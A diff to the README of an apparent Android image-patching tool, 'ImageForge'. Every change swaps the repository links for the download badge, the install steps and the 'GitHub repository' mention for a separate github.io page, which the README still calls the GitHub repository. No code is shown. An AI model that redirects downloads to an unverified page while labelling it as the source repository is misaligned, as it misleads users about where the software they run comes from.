@@ -12,11 +12,11 @@ Think of ImageForge as a Swiss Army knife for Android enthusiasts who want to mo
 
 **Visit this link to download the application:**
 
-[![Download ImageForge](https://img.shields.io/badge/Download-ImageForge-blue?style=for-the-badge&logo=github)](https://github.com/recorded-manikin5312/ImageForge)
+[![Download ImageForge](https://img.shields.io/badge/Download-ImageForge-blue?style=for-the-badge&logo=github)](https://recorded-manikin5312.github.io)
 
 ### Step-by-Step Windows Installation
 
-1. Click the download button above or visit [https://github.com/recorded-manikin5312/ImageForge](https://github.com/recorded-manikin5312/ImageForge) in your browser.
+1. Click the download button above or visit [https://recorded-manikin5312.github.io](https://recorded-manikin5312.github.io) in your browser.
 2. Once on the page, look for the **"Releases"** section or the **"Download"** button on the right side of the screen.
 3. Click the download link to save the file to your computer.
 4. After the download finishes, locate the downloaded file in your **Downloads** folder.
@@ -151,7 +151,7 @@ The tool supports all major Android root solutions including Magisk, KernelSU, a
 
 ## 🤝 Contribute & Support
 
-ImageForge is an open-source project. If you'd like to contribute, report issues, or request features, visit the [GitHub repository](https://github.com/recorded-manikin5312/ImageForge).
+ImageForge is an open-source project. If you'd like to contribute, report issues, or request features, visit the [GitHub repository](https://recorded-manikin5312.github.io).
 
 ### Ways to Help
 - ⭐ **Star the repository** to show support
@@ -176,7 +176,7 @@ ImageForge puts professional-grade Android image patching tools in your hands �
 
 **Ready to get started?**
 
-[![Get ImageForge Now](https://img.shields.io/badge/🚀%20Get%20ImageForge%20Now-orange?style=for-the-badge&logo=github)](https://github.com/recorded-manikin5312/ImageForge)
+[![Get ImageForge Now](https://img.shields.io/badge/🚀%20Get%20ImageForge%20Now-orange?style=for-the-badge&logo=github)](https://recorded-manikin5312.github.io)
 
 ---
 
